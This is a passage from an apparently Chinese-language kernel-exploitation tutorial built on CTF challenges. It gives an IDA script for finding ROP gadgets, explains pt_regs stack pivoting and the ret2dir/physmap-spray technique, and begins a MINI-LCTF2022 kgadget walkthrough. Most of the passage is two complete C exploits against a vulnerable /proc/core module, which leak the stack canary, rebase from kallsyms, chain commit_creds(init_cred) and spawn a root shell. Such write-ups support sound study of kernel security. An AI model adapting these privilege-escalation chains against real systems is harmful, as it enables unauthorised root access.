<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"></span><br><span class="line">start_ea = <span class="literal">None</span></span><br><span class="line">end_ea = <span class="literal">None</span></span><br><span class="line">max_len = <span class="number">10</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Gadget</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, addr, asms, val</span>):</span><br><span class="line">        <span class="variable language_">self</span>.addr = addr</span><br><span class="line">        <span class="variable language_">self</span>.asms = asms</span><br><span class="line">        <span class="variable language_">self</span>.val = val</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> seg <span class="keyword">in</span> idautils.Segments():</span><br><span class="line">        <span class="keyword">if</span> idc.get_segm_name(seg) == <span class="string">&#x27;.text&#x27;</span>:</span><br><span class="line">            start_ea = idc.get_segm_start(seg)</span><br><span class="line">            end_ea = idc.get_segm_end(seg)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">assert</span> start_ea != <span class="literal">None</span></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&quot;rop.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    gadgets = []</span><br><span class="line">    i = start_ea</span><br><span class="line">    <span class="keyword">while</span> i &lt; end_ea:</span><br><span class="line">        asm = idc.generate_disasm_line(i, <span class="number">0</span>).split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> asm.startswith(<span class="string">&quot;add     rsp, &quot;</span>):</span><br><span class="line">            asms = [asm.replace(<span class="string">&quot;     &quot;</span>, <span class="string">&quot; &quot;</span>)]</span><br><span class="line">            val = idc.get_operand_value(i, <span class="number">1</span>)</span><br><span class="line">            j = i + get_item_size(i)</span><br><span class="line">            <span class="keyword">while</span> j &lt; end_ea:</span><br><span class="line">                asm = idc.generate_disasm_line(j, <span class="number">0</span>).split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">                asms.append(asm.replace(<span class="string">&quot;     &quot;</span>, <span class="string">&quot; &quot;</span>))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(asms) &gt; max_len: <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;rsp&quot;</span> <span class="keyword">in</span> asm <span class="keyword">or</span> <span class="string">&quot;esp&quot;</span> <span class="keyword">in</span> asm <span class="keyword">or</span> <span class="string">&quot;leave&quot;</span> <span class="keyword">in</span> asm <span class="keyword">or</span> <span class="string">&quot;call&quot;</span> <span class="keyword">in</span> asm: <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> print_insn_mnem(j) == <span class="string">&quot;push&quot;</span>: val -= <span class="number">8</span></span><br><span class="line">                <span class="keyword">if</span> print_insn_mnem(j) == <span class="string">&quot;pop&quot;</span>: val += <span class="number">8</span></span><br><span class="line">                <span class="keyword">if</span> print_insn_mnem(j) == <span class="string">&quot;retn&quot;</span>:</span><br><span class="line">                    gadgets.append(Gadget(i, asms, val))</span><br><span class="line">                    gadget = Gadget(i, asms, val)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;val: &quot;</span> + <span class="built_in">hex</span>(gadget.val))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">hex</span>(gadget.addr) + <span class="string">&quot; : &quot;</span> + <span class="string">&quot;; &quot;</span>.join(gadget.asms) + <span class="string">&quot;;&quot;</span>)</span><br><span class="line">                    j += get_item_size(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                j += get_item_size(j)</span><br><span class="line">            i = j</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i += get_item_size(i)</span><br><span class="line">    gadgets = <span class="built_in">sorted</span>(gadgets, key=<span class="keyword">lambda</span> gadget: gadget.val)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;_________________________________________&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(gadgets))</span><br><span class="line">    <span class="keyword">for</span> gadget <span class="keyword">in</span> gadgets:</span><br><span class="line">        fp.write(<span class="string">&quot;val: &quot;</span> + <span class="built_in">hex</span>(gadget.val) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        fp.write(<span class="built_in">hex</span>(gadget.addr) + <span class="string">&quot; : &quot;</span> + <span class="string">&quot;; &quot;</span>.join(gadget.asms) + <span class="string">&quot;;\n&quot;</span>)</span><br><span class="line">    fp.close()</span><br></pre></td></tr></table></figure></div>
<p>随便选择一个可以把 <code>rsp</code> 加 0xE8 的 gadget 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/58aa5fb0dfd89dee7f3c73564d3ad88d.png"
                     
alt="在这里插入图片描述" 
                > 由于
<code>swapgs_restore_regs_and_return_to_usermode</code>
函数前面的操作是依次弹出 pt_regs 结构体中的元素，由于前面 4
个寄存器已经用来写 ROP 了，因此要从
<code>swapgs_restore_regs_and_return_to_usermode + 8</code> 开始。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/adb375bce04e6b9231e3dfa6251a7e9f.png"
                     
alt="在这里插入图片描述" 
                > 由于这里用的是正常的 <code>trap_frame</code>
因此不需要 <code>save_status</code> 和伪造 <code>trap_frame</code>
。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF8223D1A0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81000b2f</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0xe8_ret = <span class="number">0xffffffff816bb966</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF81A008DA</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> core_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">coore_read</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    write(core_fd, buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rebase</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open kallsyms.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(kallsyms_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, name)) &#123;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) commit_creds;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) prepare_kernel_cred;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] offset: %p\n&quot;</span>, offset);</span><br><span class="line">            commit_creds += offset;</span><br><span class="line">            prepare_kernel_cred += offset;</span><br><span class="line">            init_cred += offset;</span><br><span class="line">            pop_rdi_ret += offset;</span><br><span class="line">            add_rsp_0xe8_ret += offset;</span><br><span class="line">            swapgs_restore_regs_and_return_to_usermode += offset + <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] commit_creds: %p\n&quot;</span>, (<span class="type">size_t</span>) commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>, (<span class="type">size_t</span>) prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_canary</span><span class="params">()</span> &#123;</span><br><span class="line">    set_off(<span class="number">64</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    coore_read(buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *) buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    rebase();</span><br><span class="line"></span><br><span class="line">    core_fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (core_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open core.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> canary = get_canary();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">64</span>] = canary;</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">80</span>] = add_rsp_0xe8_ret;</span><br><span class="line"></span><br><span class="line">    core_write(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    __asm__(</span><br><span class="line">            <span class="string">&quot;mov r15, pop_rdi_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, init_cred;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, commit_creds;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, 0x5555555555555555;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, 0x6666666666666666;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, 0x7777777777777777;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, 0x8888888888888888;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9, 0x9999999999999999;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8, 0xaaaaaaaaaaaaaaaa;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 16;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, 0xffffffffffff0058;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, 0x6677889A;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, core_fd;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall&quot;</span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="ret2dir">ret2dir</h2>
<p>如果 <code>ptregs</code> 所在的内存被修改了导致最多只能控制 16
字节的内存我们可以利用 ret2dir
的利用方式将栈迁移至内核的线性映射区。</p>
<p>ret2dir 是哥伦比亚大学网络安全实验室在 2014
年提出的一种辅助攻击手法，主要用来绕过 smep、smap、pxn
等用户空间与内核空间隔离的防护手段，原论文见此处：<a class="link" 
 href="http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf" >http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
。 linux
系统有一部分物理内存区域同时映射到用户空间和内核空间的某个物理内存地址。一块区域叫做
direct mapping
area，即内核的线性映射区。，这个区域映射了所有的物理内存。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)</span><br></pre></td></tr></table></figure></div>
<p>下图便是原论文中对 ret2dir 这种攻击的示例，我们在用户空间中布置的
gadget 可以通过 direct mapping area 上的地址在内核空间中访问到 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/7f1ab19a5a097e3d6d65c7029fd551ca.png"
                     
alt="在这里插入图片描述" 
                > 但需要注意的是在新版的内核当中 direct
mapping area 已经不再具有可执行权限，因此我们很难再在用户空间直接布置
shellcode 进行利用，但我们仍能通过在用户空间布置 ROP 链的方式完成利用
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/b4985f26c1e6acfd7ca31a72a5494e3f.png"
                     
alt="在这里插入图片描述" 
                > 比较朴素的一种使用 ret2dir
进行攻击的手法便是：</p>
<ul>
<li>利用 mmap 在用户空间大量喷射内存</li>
<li>利用漏洞泄露出内核的“堆”上地址（通过 kmalloc
获取到的地址），这个地址直接来自于线性映射区</li>
<li>利用泄露出的内核线性映射区的地址进行内存搜索，从而找到我们在用户空间喷射的内存
此时我们就获得了一个映射到用户空间的内核空间地址，我们通过这个内核空间地址便能直接访问到用户空间的数据，从而避开了传统的隔绝用户空间与内核空间的防护手段</li>
</ul>
<p>需要注意的是我们往往没有内存搜索的机会，因此需要使用 mmap
喷射大量的物理内存写入同样的
payload，之后再随机挑选一个线性映射区上的地址进行利用，这样我们就有很大的概率命中到我们布置的
payload 上，这种攻击手法也称为 physmap spray 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">linux kernal 4.15.8</span></span><br><span class="line"><span class="comment">/Documentation/x86/x86_64/mm.txt</span></span><br><span class="line"><span class="comment">ffff880000000000 - ffffc7ffffffffff (=64 TB) direct mapping of all phys. memory</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">size_t</span> try_hit = <span class="number">0xffff880000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF8223D1A0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81000b2f</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rsp_ret = <span class="number">0xffffffff81001689</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0xe8_ret = <span class="number">0xffffffff816bb966</span>;</span><br><span class="line"><span class="type">size_t</span> ret = <span class="number">0xFFFFFFFF8100168A</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF81A008DA</span>;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> core_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">coore_read</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    write(core_fd, buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rebase</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open kallsyms.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(kallsyms_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, name)) &#123;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) commit_creds;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) prepare_kernel_cred;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] offset: %p\n&quot;</span>, offset);</span><br><span class="line">            commit_creds += offset;</span><br><span class="line">            prepare_kernel_cred += offset;</span><br><span class="line">            init_cred += offset;</span><br><span class="line">            pop_rdi_ret += offset;</span><br><span class="line">            add_rsp_0xe8_ret += offset;</span><br><span class="line">            pop_rsp_ret += offset;</span><br><span class="line">            ret += offset;</span><br><span class="line">            swapgs_restore_regs_and_return_to_usermode += offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] commit_creds: %p\n&quot;</span>, (<span class="type">size_t</span>) commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>, (<span class="type">size_t</span>) prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_canary</span><span class="params">()</span> &#123;</span><br><span class="line">    set_off(<span class="number">64</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    coore_read(buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *) buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">physmap_spray</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">    <span class="type">size_t</span> *rop = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> it = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; it &lt; (page_size / <span class="number">8</span> - <span class="number">11</span>); it++) &#123;</span><br><span class="line">        rop[it] = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[it++] = pop_rdi_ret;</span><br><span class="line">    rop[it++] = init_cred;</span><br><span class="line">    rop[it++] = commit_creds;</span><br><span class="line">    rop[it++] = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x16</span>;</span><br><span class="line">    rop[it++] = <span class="number">0</span>;</span><br><span class="line">    rop[it++] = <span class="number">0</span>;</span><br><span class="line">    rop[it++] = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    rop[it++] = user_cs;</span><br><span class="line">    rop[it++] = user_rflags;</span><br><span class="line">    rop[it++] = user_sp;</span><br><span class="line">    rop[it++] = user_ss;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying physmap...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">30000</span>; i++) &#123;</span><br><span class="line">        <span class="type">void</span> *page = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(page, rop, page_size);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    rebase();</span><br><span class="line">    save_status();</span><br><span class="line">    physmap_spray();</span><br><span class="line"></span><br><span class="line">    core_fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (core_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open core.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> canary = get_canary();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">64</span>] = canary;</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">80</span>] = add_rsp_0xe8_ret;</span><br><span class="line"></span><br><span class="line">    core_write(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">            <span class="string">&quot;mov r15, pop_rsp_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, try_hit;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, 0x3333333333333333;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, 0x4444444444444444;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, 0x5555555555555555;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, 0x6666666666666666;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, 0x7777777777777777;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, 0x8888888888888888;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9, 0x9999999999999999;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8, 0xaaaaaaaaaaaaaaaa;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rcx, 0xbbbbbbbbbbbbbbbb;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 16;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, 0xffffffffffff0058;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, 0x6677889A;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, core_fd;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="例题mini-lctf2022---kgadget">例题：MINI-LCTF2022 - kgadget</h3>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/mini-LCTF2022_kgadget" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
主要漏洞点在 kgaget_ioctl 函数上。分析如下： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/386592fb6e46eacb2bed872758670d9c.png"
                     
alt="在这里插入图片描述" 
                > 总之这个函数可以执行指定位置的代码。
不过根据输出他提示信息， pt_regs 中只有 r8 和 r9
寄存器可以使用，但是除去这两个寄存器和系统调用以及传参用掉的寄存器还有
r11 和 rcx 的值没有被覆盖。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/de5716724b83c666f3f6881dd04c47f4.png"
                     
alt="在这里插入图片描述" 
                >
为了探究原因，首先在系统调用前将寄存器赋值为特殊值。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9cdcd27f4cfbec888b89ef6a0ed46ad5.png"
                     
alt="在这里插入图片描述" 
                > 然后在 entry_SYSCALL_64
函数处下一个条件端点。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/8ac2c85a68edd906197209fdaf4b88d0.png"
                     
alt="在这里插入图片描述" 
                > 运行测试程序成功断在了目标位置。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/34c2d30955aae28e3986dcfaaf018cab.png"
                     
alt="在这里插入图片描述" 
                > 观察寄存器发现 rcx 和 r11
以经被写入其他值了。因此这两个寄存器实际上是无法利用的。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d49cd238e5a6cfcce011c989cbb28c63.png"
                     
alt="在这里插入图片描述" 
                > 漏洞利用的手段比较巧妙。
首先在用户空间喷射大量下图所示的内存页。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/161da962d3ac6d22d69acf080c5b8440.png"
                     
alt="在这里插入图片描述" 
